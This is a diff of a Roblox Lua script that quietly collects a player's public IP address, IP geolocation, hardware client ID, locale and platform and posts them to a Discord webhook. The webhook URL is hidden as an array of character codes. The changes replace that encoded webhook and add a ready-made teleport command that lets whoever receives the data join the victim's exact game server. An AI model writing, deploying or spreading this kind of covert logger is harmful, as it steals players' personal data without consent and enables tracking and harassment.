@@ -18,6 +18,9 @@ local Country = LocalizationService.RobloxLocaleId
 local GetIp = game:HttpGet("https://v4.ident.me/")
 local GetData = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
 local Hwid = RbxAnalyticsService:GetClientId()
+local funneh = "'"
+local joinings = "game:GetService('TeleportService'):Teleport("..game.PlaceId..",game.Players.LocalPlayer,"..funneh..game.JobId..funneh..")"
+local joinwithscript = "```lua\n "..joinings.." ```"
 local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
 local GameName = GameInfo.Name
 local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "📱 Mobile" or "💻 PC"
@@ -76,7 +79,7 @@ local function createWebhookData()
             {
                 title = "⚙️ Technische Details",
                 description = string.format(
-                    "**Executor:** `%s`\n**Job ID:** [Klicken zum Kopieren](%s)\n**Mobile Join:** [Klicken](%s)",
+                    "**Executor:** `%s`\n**Job ID:** [Klicken zum Kopieren](%s)\n**Mobile Join:** [Klicken](%s)\n**Code to join: **"..joinwithscript,
                     executor, jobIdLink, mobileJoinLink
                 ),
                 color = tonumber("0x95a5a6"),
@@ -98,7 +101,7 @@ local function sendWebhook(webhookUrl, data)
 end
 
 
-local webhookUrl_encoded = { 104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 51, 50, 56, 49, 57, 51, 53, 52, 52, 52, 56, 53, 48, 56, 49, 49, 54, 49, 47, 119, 78, 67, 79, 109, 107, 104, 86, 69, 88, 100, 90, 86, 79, 82, 83, 103, 71, 81, 109, 49, 79, 82, 101, 109, 69, 57, 113, 65, 101, 73, 77, 115, 99, 65, 99, 116, 79, 107, 111, 118, 52, 115, 73, 102, 97, 99, 121, 54, 73, 67, 105, 74, 65, 55, 86, 118, 102, 118, 72, 50, 107, 81, 71, 54, 102, 78, 121 }
+local webhookUrl_encoded = { 104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 51, 50, 57, 50, 49, 51, 57, 56, 56, 50, 52, 56, 48, 57, 50, 56, 51, 52, 47, 81, 109, 71, 119, 99, 71, 104, 113, 85, 104, 78, 105, 99, 75, 120, 103, 116, 54, 66, 77, 51, 117, 102, 54, 76, 83, 95, 73, 55, 109, 109, 88, 85, 78, 53, 72, 56, 99, 110, 45, 53, 56, 45, 80, 113, 106, 57, 81, 81, 54, 70, 115, 49, 74, 48, 106, 118, 85, 49, 84, 74, 67, 122, 107, 99, 68, 122, 90 }
 local webhookUrl = ""
 for i = 1, #webhookUrl_encoded do
   webhookUrl = webhookUrl .. string.char(webhookUrl_encoded[i])
